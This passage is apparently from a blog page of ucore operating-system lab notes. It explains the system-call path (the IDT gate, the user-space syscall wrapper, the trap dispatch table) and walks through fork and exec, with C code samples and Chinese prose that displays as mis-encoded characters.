åˆå§‹åŒ–ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„ä¸­æ–­æè¿°ç¬¦</h4><p>åœ¨ucoreåˆå§‹åŒ–å‡½æ•°kern_initä¸­è°ƒç”¨äº†idt_initå‡½æ•°æ¥åˆå§‹åŒ–ä¸­æ–­æè¿°ç¬¦è¡¨ï¼Œå¹¶è®¾ç½®ä¸€ä¸ªç‰¹å®šä¸­æ–­å·çš„ä¸­æ–­é—¨ï¼Œä¸“é—¨ç”¨äºç”¨æˆ·è¿›ç¨‹è®¿é—®ç³»ç»Ÿè°ƒç”¨ã€‚æ­¤äº‹ç”±ide_initå‡½æ•°å®Œæˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">idt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">extern</span> <span class="hljs-keyword">uintptr_t</span> __vectors[];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(idt) / <span class="hljs-keyword">sizeof</span>(struct gatedesc); i ++) &#123;<br>        SETGATE(idt[i], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);<br>    &#125;<br>    SETGATE(idt[T_SYSCALL], <span class="hljs-number">1</span>, GD_KTEXT, __vectors[T_SYSCALL], DPL_USER);<br>    lidt(&amp;idt_pd);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ‰§è¡ŒåŠ è½½ä¸­æ–­æè¿°ç¬¦è¡¨lidtæŒ‡ä»¤å‰ï¼Œä¸“é—¨è®¾ç½®äº†ä¸€ä¸ªç‰¹æ®Šçš„ä¸­æ–­æè¿°ç¬¦idt[T_SYSCALL]ï¼Œå®ƒçš„ç‰¹æƒçº§è®¾ç½®ä¸ºDPL_USERï¼Œä¸­æ–­å‘é‡å¤„ç†åœ°å€åœ¨__vectors[T_SYSCALL]å¤„ã€‚è¿™æ ·å»ºç«‹å¥½è¿™ä¸ªä¸­æ–­æè¿°ç¬¦åï¼Œä¸€æ—¦ç”¨æˆ·è¿›ç¨‹æ‰§è¡Œâ€œINT T_SYSCALLâ€åï¼Œç”±äºæ­¤ä¸­æ–­å…è®¸ç”¨æˆ·æ€è¿›ç¨‹äº§ç”Ÿï¼ˆæ³¨æ„å®ƒçš„ç‰¹æƒçº§è®¾ç½®ä¸ºDPL_USERï¼‰ï¼Œæ‰€ä»¥CPUå°±ä¼šä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Œä¿å­˜ç›¸å…³å¯„å­˜å™¨ï¼Œå¹¶è·³è½¬åˆ°__vectors[T_SYSCALL]å¤„å¼€å§‹æ‰§è¡Œï¼Œå½¢æˆå¦‚ä¸‹æ‰§è¡Œè·¯å¾„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">vector128(vectors.S)--\&gt;<br>__alltraps(trapentry.S)--\&gt;trap(trap.c)--\&gt;trap_dispatch(trap.c)--\&gt;syscall(syscall.c)<br></code></pre></div></td></tr></table></figure><p>åœ¨syscallä¸­ï¼Œæ ¹æ®ç³»ç»Ÿè°ƒç”¨å·æ¥å®Œæˆä¸åŒçš„ç³»ç»Ÿè°ƒç”¨æœåŠ¡ã€‚</p><h4 id="b-å»ºç«‹ç³»ç»Ÿè°ƒç”¨çš„-ç”¨æˆ·åº“-å‡†å¤‡"><a href="#b-å»ºç«‹ç³»ç»Ÿè°ƒç”¨çš„-ç”¨æˆ·åº“-å‡†å¤‡" class="headerlink" title="b. å»ºç«‹ç³»ç»Ÿè°ƒç”¨çš„**ç”¨æˆ·åº“**å‡†å¤‡"></a>b. å»ºç«‹ç³»ç»Ÿè°ƒç”¨çš„**<u>ç”¨æˆ·åº“</u>**å‡†å¤‡</h4><p>åœ¨æ“ä½œç³»ç»Ÿä¸­åˆå§‹åŒ–å¥½ç³»ç»Ÿè°ƒç”¨ç›¸å…³çš„ä¸­æ–­æè¿°ç¬¦ã€ä¸­æ–­å¤„ç†èµ·å§‹åœ°å€ç­‰åï¼Œè¿˜éœ€åœ¨ç”¨æˆ·æ€çš„åº”ç”¨ç¨‹åºä¸­åˆå§‹åŒ–å¥½ç›¸å…³å·¥ä½œï¼Œç®€åŒ–åº”ç”¨ç¨‹åºè®¿é—®ç³»ç»Ÿè°ƒç”¨çš„å¤æ‚æ€§ã€‚<strong>ä¸ºæ­¤åœ¨ç”¨æˆ·æ€å»ºç«‹äº†ä¸€ä¸ªä¸­é—´å±‚ï¼Œå³ç®€åŒ–çš„libcå®ç°</strong>ï¼Œåœ¨user/libs/ulib.[ch]å’Œuser/libs/syscall.[ch]ä¸­å®Œæˆäº†å¯¹è®¿é—®ç³»ç»Ÿè°ƒç”¨çš„å°è£…ã€‚ç”¨æˆ·æ€æœ€ç»ˆçš„è®¿é—®ç³»ç»Ÿè°ƒç”¨å‡½æ•°æ˜¯syscallï¼Œå®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, ...)</span> </span>&#123;<br>    va_list ap;<br>    va_start(ap, num);<br>    <span class="hljs-keyword">uint32_t</span> a[MAX_ARGS];<br>    <span class="hljs-keyword">int</span> i, ret;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_ARGS; i ++) &#123;<br>        a[i] = va_arg(ap, <span class="hljs-keyword">uint32_t</span>);<br>    &#125;<br>    va_end(ap);<br><br>    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;int %1;&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;=a&quot;</span> (ret)</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;i&quot;</span> (T_SYSCALL),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;a&quot;</span> (num),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;d&quot;</span> (a[<span class="hljs-number">0</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;c&quot;</span> (a[<span class="hljs-number">1</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;b&quot;</span> (a[<span class="hljs-number">2</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;D&quot;</span> (a[<span class="hljs-number">3</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;S&quot;</span> (a[<span class="hljs-number">4</span>])</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;cc&quot;</span>, <span class="hljs-string">&quot;memory&quot;</span>)</span></span>;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ä»ä¸­å¯ä»¥çœ‹å‡ºï¼Œåº”ç”¨ç¨‹åºè°ƒç”¨çš„exit/fork/wait/getpidç­‰åº“å‡½æ•°æœ€ç»ˆéƒ½ä¼šè°ƒç”¨syscallå‡½æ•°ï¼Œåªæ˜¯è°ƒç”¨çš„å‚æ•°ä¸åŒè€Œå·²ï¼Œå¦‚æœçœ‹æœ€ç»ˆçš„æ±‡ç¼–ä»£ç ä¼šæ›´æ¸…æ¥šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">â€¦â€¦<br>  34:    8b 55 d4               mov    -0x2c(%ebp),%edx<br>  37:    8b 4d d8               mov    -0x28(%ebp),%ecx<br>  3a:    8b 5d dc               mov    -0x24(%ebp),%ebx<br>  3d:    8b 7d e0               mov    -0x20(%ebp),%edi<br>  40:    8b 75 e4               mov    -0x1c(%ebp),%esi<br>  43:    8b 45 08               mov    0x8(%ebp),%eax<br>  46:    cd 80                  int    $0x80<br>  48: 89 45 f0                mov    %eax,-0x10(%ebp)<br>â€¦â€¦<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶å®æ˜¯æŠŠç³»ç»Ÿè°ƒç”¨å·æ”¾åˆ°EAXï¼Œå…¶ä»–5ä¸ªå‚æ•°a[0]~a[4]åˆ†åˆ«ä¿å­˜åˆ°EDX/ECX/EBX/EDI/ESIäº”ä¸ªå¯„å­˜å™¨ä¸­ï¼ŒåŠæœ€å¤šç”¨6ä¸ªå¯„å­˜å™¨æ¥ä¼ é€’ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ï¼Œä¸”ç³»ç»Ÿè°ƒç”¨çš„è¿”å›ç»“æœæ˜¯EAXã€‚æ¯”å¦‚å¯¹äºgetpidåº“å‡½æ•°è€Œè¨€ï¼Œç³»ç»Ÿè°ƒç”¨å·ï¼ˆSYS_getpid=18ï¼‰æ˜¯ä¿å­˜åœ¨EAXä¸­ï¼Œè¿”å›å€¼ï¼ˆè°ƒç”¨æ­¤åº“å‡½æ•°çš„çš„å½“å‰è¿›ç¨‹å·pidï¼‰ä¹Ÿåœ¨EAXä¸­ã€‚</p><h4 id="c-ä¸ç”¨æˆ·è¿›ç¨‹ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨"><a href="#c-ä¸ç”¨æˆ·è¿›ç¨‹ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="c. ä¸ç”¨æˆ·è¿›ç¨‹ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨"></a>c. ä¸ç”¨æˆ·è¿›ç¨‹ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨</h4><p>åœ¨æœ¬å®éªŒä¸­ï¼Œä¸è¿›ç¨‹ç›¸å…³çš„å„ä¸ªç³»ç»Ÿè°ƒç”¨å±æ€§å¦‚ä¸‹æ‰€ç¤ºï¼š</p><table><thead><tr><th>ç³»ç»Ÿè°ƒç”¨å</th><th>å«ä¹‰</th><th>å…·ä½“å®ŒæˆæœåŠ¡çš„å‡½æ•°</th></tr></thead><tbody><tr><td>SYS_exit</td><td>process exit</td><td>do_exit</td></tr><tr><td>SYS_fork</td><td>create child process, dup mm</td><td>do_forkâ€“&gt;wakeup_proc</td></tr><tr><td>SYS_wait</td><td>wait child process</td><td>do_wait</td></tr><tr><td>SYS_exec</td><td>after fork, process execute a new program</td><td>load a program and refresh the mm</td></tr><tr><td>SYS_yield</td><td>process flag itself need resecheduling</td><td>proc-&gt;need_sched=1, then scheduler will rescheule this process</td></tr><tr><td>SYS_kill</td><td>kill process</td><td>do_killâ€“&gt;proc-&gt;flags |= PF_EXITING, â€“&gt;wakeup_procâ€“&gt;do_waitâ€“&gt;do_exit</td></tr><tr><td>SYS_getpid</td><td>get the processâ€™s pid</td><td></td></tr></tbody></table><p>é€šè¿‡è¿™äº›ç³»ç»Ÿè°ƒç”¨ï¼Œå¯æ–¹ä¾¿åœ°å®Œæˆä»è¿›ç¨‹/çº¿ç¨‹åˆ›å»ºåˆ°é€€å‡ºçš„æ•´ä¸ªè¿è¡Œè¿‡ç¨‹ã€‚</p><h4 id="d-ç³»ç»Ÿè°ƒç”¨çš„æ‰§è¡Œè¿‡ç¨‹"><a href="#d-ç³»ç»Ÿè°ƒç”¨çš„æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="d. ç³»ç»Ÿè°ƒç”¨çš„æ‰§è¡Œè¿‡ç¨‹"></a>d. ç³»ç»Ÿè°ƒç”¨çš„æ‰§è¡Œè¿‡ç¨‹</h4><p>å½“è¿›å…¥int 0x80ä¸­æ–­å, å¤„ç†å™¨å’Œæ±‡ç¼–ç åˆä½œå®Œæˆå‹å…¥trapframe, è°ƒç”¨trapå‡½æ•°, å¯ä»¥çœ‹åˆ°å’Œä¹‹å‰çš„ä»£ç å¤šäº†åˆ¤æ–­currentçš„éƒ¨åˆ†, </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">trap</span><span class="hljs-params">(struct trapframe *tf)</span> </span>&#123;<br>    <span class="hljs-comment">// dispatch based on what type of trap occurred</span><br>    <span class="hljs-comment">// used for previous projects</span><br>    <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">NULL</span>) &#123;<br>        trap_dispatch(tf);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// keep a trapframe chain in stack</span><br>        <span class="hljs-comment">// å¹²å˜›è¦ä¿å­˜è¿™ä¸œè¥¿?</span><br>        struct trapframe *otf = current-&gt;tf;<br>        current-&gt;tf = tf;<br><br>        <span class="hljs-keyword">bool</span> in_kernel = trap_in_kernel(tf);<br><br>        trap_dispatch(tf);<br><br>        current-&gt;tf = otf;<br>        <span class="hljs-keyword">if</span> (!in_kernel) &#123;<br>            <span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_EXITING) &#123;<span class="hljs-comment">//åªæœ‰do_kill()æ‰ä¼šè®¾ç½®PF_EXITING</span><br>                do_exit(-E_KILLED);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (current-&gt;need_resched) &#123;<br>                schedule();<br>            &#125;&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><p>ç„¶åè¿›å…¥trap_dispatch()ä¸­çš„syscall(), æ¯”è¾ƒå·§å¦™çš„æ˜¯é€šè¿‡<strong>å‡½æ•°æŒ‡é’ˆåˆ—è¡¨</strong>æ¥ç¡®å®šè°ƒç”¨å“ªä¸ªå‡½æ•°:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">int</span> <span class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> arg[])</span> </span>= &#123; <span class="hljs-comment">//funtion ptr array</span><br>    [SYS_exit]              sys_exit,<br>    [SYS_fork]              sys_fork,<br>    [SYS_wait]              sys_wait,<br>    [SYS_exec]              sys_exec,<br>    [SYS_yield]             sys_yield,<br>    [SYS_kill]              sys_kill,<br>    [SYS_getpid]            sys_getpid,<br>    [SYS_putc]              sys_putc,<br>    [SYS_pgdir]             sys_pgdir,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NUM_SYSCALLS        ((sizeof(syscalls)) / (sizeof(syscalls[0])))</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-keyword">uint32_t</span> arg[<span class="hljs-number">5</span>];<br>    <span class="hljs-keyword">int</span> num = tf-&gt;tf_regs.reg_eax;<br>    <span class="hljs-keyword">if</span> (num &gt;= <span class="hljs-number">0</span> &amp;&amp; num &lt; NUM_SYSCALLS) &#123;<br>        <span class="hljs-keyword">if</span> (syscalls[num] != <span class="hljs-literal">NULL</span>) &#123;<br>            arg[<span class="hljs-number">0</span>] = tf-&gt;tf_regs.reg_edx;<br>            arg[<span class="hljs-number">1</span>] = tf-&gt;tf_regs.reg_ecx;<br>            arg[<span class="hljs-number">2</span>] = tf-&gt;tf_regs.reg_ebx;<br>            arg[<span class="hljs-number">3</span>] = tf-&gt;tf_regs.reg_edi;<br>            arg[<span class="hljs-number">4</span>] = tf-&gt;tf_regs.reg_esi;<br>            tf-&gt;tf_regs.reg_eax = syscalls[num](arg);<span class="hljs-comment">//`syscalls[num]` is function ptr, and `(arg)` is argument</span><br>            <span class="hljs-keyword">return</span> ;<br>        &#125;<br>    &#125;<br>    print_trapframe(tf);<br>    panic(<span class="hljs-string">&quot;undefined syscall %d, pid = %d, name = %s.\n&quot;</span>,<br>            num, current-&gt;pid, current-&gt;name);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å¦‚æœä»å“ªä¸ªç³»ç»Ÿè°ƒç”¨è¿”å›äº†å°±æ‰§è¡Œæ­£å¸¸çš„ä¸­æ–­é€€å‡º(æ¯”å¦‚fork).</p><h3 id="4-fork-exec-wait-exit"><a href="#4-fork-exec-wait-exit" class="headerlink" title="4.fork/exec/wait/exit"></a>4.fork/exec/wait/exit</h3><h4 id="fork"><a href="#fork" class="headerlink" title="fork():"></a>fork():</h4><blockquote><p>é‡å¤äº†ä¸€ä¸‹lab4ä¸­çš„å†…å®¹, æœ‰ç‚¹ä¸ç†Ÿæ‚‰, è¿™ç§æµç¨‹åˆ†æè¿˜æ˜¯è¦è‡ªå·±å†™</p></blockquote><p><img src="../../image/ucore/image-20211228201516840.png" alt="image-20211228201516840"></p><p>sys_fork()ç®€å•çš„ä»current-&gt;tfä¸­å–å‡ºstackåœ°å€, ä½œä¸ºå‚æ•°è°ƒç”¨do_fork():</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sys_fork</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> arg[])</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-keyword">uintptr_t</span> <span class="hljs-built_in">stack</span> = tf-&gt;tf_esp;<br>    <span class="hljs-comment">//int do_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe *tf)</span><br>    <span class="hljs-keyword">return</span> do_fork(<span class="hljs-number">0</span>, <span class="hljs-built_in">stack</span>, tf);<br>&#125;<br></code></pre></div></td></tr></table></figure><p> åœ¨è¿™é‡Œå€¼å¾—è‡ªå·±æ€è€ƒä¸€ä¸‹forkä¸€ä¸ªè¿›ç¨‹éœ€è¦åšå‡ºå“ªäº›å·¥ä½œ?</p><ul><li>é¦–å…ˆä¸€ä¸ªè¿›ç¨‹æœ‰è‡ªå·±çš„æ§åˆ¶å—proc_struct, æˆ‘ä»¬éœ€è¦alloc_proc()ä¸€ä¸ª</li><li>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„å†…æ ¸æ ˆ, éœ€è¦é‡æ–°alloc2ä¸ª4KBçš„page(KSTACKSIZE)</li><li>è¿˜æœ‰ä¸€ä¸ªmm_structä¹Ÿå¾ˆé‡è¦, éœ€è¦allocä¸€ä¸ªå¹¶å°†æ—§çš„å¤åˆ¶åˆ°æ–°è¿›ç¨‹ä¸­<ul><li>è¿˜è¦çœ‹clone_flag, å¦‚æœä¸ºfalseåˆ™å»ºç«‹æ–°çš„, å¦åˆ™ç›´æ¥ä½¿ç”¨æ—§çš„</li><li>è°ƒç”¨mm_creat(); æ³¨æ„åˆ°mmä¸­ç®¡ç†ç€é¡µç›®å½•è¡¨, è¿˜è¦é‡æ–°å»ºç«‹ä¸€ä¸ªæ–°çš„; ç„¶åæ˜¯**lock_mm(oldmm)(ä¸çŸ¥é“æ˜¯ä»€ä¹ˆ)**ç´§è·Ÿç€dup_mmæ¥å¤åˆ¶å†…å­˜ç©ºé—´ä¸­çš„å†…å®¹, æ³¨æ„åˆ°å†…å­˜ç©ºé—´æ˜¯ç”±mmä¸­çš„vmaé“¾è¡¨ç®¡ç†çš„, éœ€è¦éå†æ¯ä¸€ä¸ªvmaå—, ç„¶åå†è°ƒç”¨<code>copy_range(to-&gt;pgdir, from-&gt;pgdir, vma-&gt;vm_start, vma-&gt;vm_end, share)</code>æ¥copyå†…å­˜, å…·ä½“è¯¦è§ç»ƒä¹ 2.</li></ul></li><li>ç„¶åè¦è®¾ç½®ä¸€ä¸‹å­è¿›ç¨‹çš„ä¸€äº›çŠ¶æ€, copy_threadå‡½æ•°åœ¨lab4ä¸­æœ‰ä»‹ç».</li><li>æ’å…¥é“¾è¡¨(ä¸¤ä¸ª), è®¾ç½®å…³ç³», ç„¶åwakeup, ç»“æŸ</li></ul><p><code>set_links</code>å‡½æ•°ä¼šä¸ºå½“å‰è¿›ç¨‹é—´è®¾ç½®åˆé€‚çš„å…³ç³»ï¼Œå…¶å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*************************************************************</span><br><span class="hljs-comment">process relations</span><br><span class="hljs-comment">parent:           proc-&gt;parent  (proc is children)</span><br><span class="hljs-comment">children:         proc-&gt;cptr    (proc is parent)</span><br><span class="hljs-comment">older sibling:    proc-&gt;optr    (proc is younger sibling)</span><br><span class="hljs-comment">younger sibling:  proc-&gt;yptr    (proc is older sibling)</span><br><span class="hljs-comment">*************************************************************/</span><br><span class="hljs-comment">// set_links - set the relation links of process</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">set_links</span><span class="hljs-params">(struct proc_struct *proc)</span> </span>&#123;<br>    list_add(&amp;proc_list, &amp;(proc-&gt;list_link));<br>    proc-&gt;yptr = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((proc-&gt;optr = proc-&gt;parent-&gt;cptr) != <span class="hljs-literal">NULL</span>)<br>        proc-&gt;optr-&gt;yptr = proc;<br>    proc-&gt;parent-&gt;cptr = proc;<br>    nr_process ++;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>é™¤äº†lab4ç†ŸçŸ¥çš„<code>list_add</code>ä¸<code>nr_process++</code>ï¼Œè¯¥å‡½æ•°è¿˜è®¾ç½®äº†<code>proc_struct</code>ä¸­çš„<code>optrã€yptr</code>ä»¥åŠ<code>cptr</code>æˆå‘˜ã€‚</p></li><li><p>å…¶ä¸­ï¼Œ<code>cptr</code>æŒ‡é’ˆæŒ‡å‘å½“å‰è¿›ç¨‹çš„å­è¿›ç¨‹ä¸­ï¼Œ<strong>æœ€æ–°åˆ›å»º</strong>çš„é‚£ä¸ªå­è¿›ç¨‹ï¼Œå³<code>children</code>ï¼›<code>yptr</code>æŒ‡å‘<strong>ä¸å½“å‰è¿›ç¨‹å…±äº«åŒä¸€ä¸ªçˆ¶è¿›ç¨‹ï¼Œä½†æ¯”å½“å‰è¿›ç¨‹çš„åˆ›å»ºæ—¶é—´æ›´æ™šçš„è¿›ç¨‹</strong>ï¼Œå³<code>younger sibling</code>ã€‚è€Œ<code>optr</code>æŒ‡é’ˆçš„åŠŸèƒ½åˆ™ä¸<code>yptr</code>ç›¸åï¼ŒæŒ‡å‘<code>older sibling</code>ã€‚</p></li><li><p>è¿›ç¨‹é—´å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤º</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">                     +----------------+<br>                     | parent process |<br>                     +----------------+<br>              parent ^         \       ^  parent<br>                    /           \       \<br>                   /             \ cptr  \<br>                  /         yptr  V       \      yptr<br>           +-------------+  --&gt;  +-------------+  --&gt;  <span class="hljs-literal">NULL</span><br>           | old process |       | New Process |<br><span class="hljs-literal">NULL</span>  &lt;--  +-------------+  &lt;--  +-------------+<br>      optr                  optr<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="exec"><a href="#exec" class="headerlink" title="exec():"></a>exec():</h4><p>é¦–å…ˆä»do_execå‚æ•°æ¥çœ‹éœ€è¦åˆ›å»ºè¿›ç¨‹åç§°å­—ç¬¦æ•°ç»„, ç¨‹åºé•¿åº¦, ELFæ–‡ä»¶åœ°å€, å¤§å°å››ä¸ªå‚æ•°</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *binary, <span class="hljs-keyword">size_t</span> size)</span> </span><br></code></pre></div></td></tr></table></figure><p>å…·ä½“æ³¨é‡Šåœ¨ä¸‹æ–¹:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_execve</span><span class="hljs-params">(<span 